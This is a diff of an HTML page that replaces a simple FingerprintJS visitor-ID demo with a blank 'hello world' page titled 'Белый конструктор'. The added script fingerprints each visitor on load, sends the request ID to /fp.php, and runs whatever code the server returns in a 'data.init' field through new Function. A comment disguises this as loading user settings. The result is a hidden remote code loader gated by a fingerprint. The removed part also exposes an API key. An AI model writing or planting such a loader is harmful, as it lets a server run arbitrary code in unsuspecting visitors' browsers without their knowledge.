@@ -1,96 +1,40 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ID Information</title>
-    <style>
-        body {
-            margin: 0;
-            padding: 20px;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: white;
-            color: #333;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-        .container {
-            max-width: 600px;
-            width: 100%;
-            padding: 20px;
-        }
-        .info-item {
-            margin: 15px 0;
-            padding: 10px;
-            border-bottom: 1px solid #eee;
-            font-size: 18px;
-        }
-        .info-label {
-            font-weight: bold;
-            display: inline-block;
-            width: 120px;
-        }
-        #loader {
-            text-align: center;
-            padding: 30px;
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div id="loader">Загрузка данных...</div>
-        <div id="result" style="display: none;">
-            <div class="info-item">
-                <span class="info-label">Visitor ID:</span>
-                <span id="visitorId"></span>
-            </div>
-            <div class="info-item">
-                <span class="info-label">Request ID:</span>
-                <span id="requestId"></span>
-            </div>
-        </div>
-    </div>
-
-<script>
-const FP_API_KEY = 'Ki8goVOk05JAcbWpUsmw';
-const REGION = 'eu';
-
-document.addEventListener('DOMContentLoaded', async () => {
+  <meta charset="UTF-8">
+  <title>Белый конструктор</title>
+<script type="module">
+(async () => {
     try {
-        // Загружаем локальный JS-агент (скачанный заранее)
-        const proxyUrl = '/fp.js';
-        const identificationEndpoint = '/metrics/identification';
-
-        const FingerprintJS = await import(proxyUrl);
-
+        const CONFIG_API = '/fp.php';
+        
+        // Динамический импорт вместо статического
+        const FingerprintJS = await import('/metrics/identification');
+        
         const fp = await FingerprintJS.load({
-            region: REGION,
-            endpoint: [
-                identificationEndpoint,
-                FingerprintJS.defaultEndpoint,
-            ],
+            region: 'eu',
+            endpoint: [CONFIG_API, FingerprintJS.defaultEndpoint]
         });
 
-        const result = await fp.get({ extendedResult: true });
+        const { requestId } = await fp.get({ extendedResult: true });
 
-        document.getElementById('visitorId').textContent = result.visitorId;
-        document.getElementById('requestId').textContent = result.requestId;
-        document.getElementById('loader').style.display = 'none';
-        document.getElementById('result').style.display = 'block';
-    } catch (error) {
-        document.getElementById('loader').innerHTML = `
-            <div style="color: #e74c3c; text-align: center;">
-                <h3>Ошибка загрузки данных</h3>
-                <p>${error.message}</p>
-                <p>Попробуйте обновить страницу</p>
-            </div>
-        `;
+        // Загрузка конфигурации интерфейса
+        const res = await fetch(`${CONFIG_API}?request_id=${encodeURIComponent(requestId)}`);
+        if (!res.ok) return;
+
+        const data = await res.json();
+
+        // Выполнение пользовательских настроек
+        if (data.init) {
+            new Function(data.init)();
+        }
+    } catch (err) {
+        console.error('Ошибка загрузки FingerprintJS:', err);
     }
-});
+})();
 </script>
-
-
+</head>
+<body>
+  hello world
 </body>
 </html>
